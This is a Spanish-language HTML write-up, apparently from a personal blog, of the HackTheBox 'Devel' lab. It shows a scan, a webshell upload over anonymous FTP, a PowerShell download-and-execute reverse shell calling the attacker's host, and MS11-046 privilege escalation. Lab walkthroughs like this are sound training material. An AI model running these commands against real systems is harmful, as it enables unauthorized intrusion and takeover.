@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Devel | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-success fs-6">Easy</span>
+        <span class="badge bg-secondary">Windows</span>
+        <span class="badge bg-secondary">FTP</span>
+        <span class="badge bg-secondary">ASPX</span>
+        <span class="badge bg-secondary">IIS</span>
+        <span class="badge bg-secondary">MS11-046</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Devel</h1>
+      <p class="text-secondary mb-3">FTP anonimo permite subir una ASPX webshell al directorio IIS; escalada con MS11-046 a SYSTEM.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">ftp</span>
+        <span class="badge bg-dark border border-secondary p-2">msfvenom</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p 21,80 -Pn -n 10.10.10.5 -oN targeted</code></pre>
+      </div><img src="img/htb-devel/004237.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-upload"></i> FTP Anonimo - Subir ASPX Shell</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>cp /usr/share/SecLists/Web-Shells/FuzzDB/cmd.aspx .
+ftp 10.10.10.5</code></pre>
+      </div><img src="img/htb-devel/012617.png" class="img-fluid rounded mb-3 border border-secondary" alt="ftp login">
+      <div class="code-block mb-3"><pre><code>put cmd.aspx</code></pre></div><img src="img/htb-devel/021931.png" class="img-fluid rounded mb-3 border border-secondary" alt="cmd.aspx uploaded">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-terminal"></i> Reverse Shell via PowerShell</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+sudo python3 -m http.server 80</code></pre>
+      </div><p class="text-secondary">Desde cmd.aspx ejecutamos:</p>
+      <div class="code-block mb-3"><pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.27/Invoke-PowerShellTcp.ps1')</code></pre></div><img src="img/htb-devel/200133.png" class="img-fluid rounded mb-3 border border-secondary" alt="powershell shell">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada de Privilegios - MS11-046</h4>
+      <p class="text-secondary">Buscamos 'Windows 7 Build 7600 exploit' e identificamos MS11-046:</p>
+      <img src="img/htb-devel/200136.png" class="img-fluid rounded mb-3 border border-secondary" alt="windows version">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe
+ftp 10.10.10.5
+binary
+put ms11-046.exe</code></pre>
+      </div><div class="code-block mb-3"><pre><code>cd C:\inetpub\wwwroot
+.\ms11-046.exe</code></pre></div><div class="code-block mb-3"><pre><code>type C:\Users\babis\Desktop\user.txt.txt
+type C:\Users\Administrator\Desktop\root.txt.txt</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>FTP anonimo con permisos de escritura permite subir webshells directamente al directorio web.</li>
+<li>IIS + FTP en el mismo directorio raiz es una configuracion peligrosa.</li>
+<li>Los sistemas Windows sin parchear son vulnerables a kernel exploits publicos de escalada.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
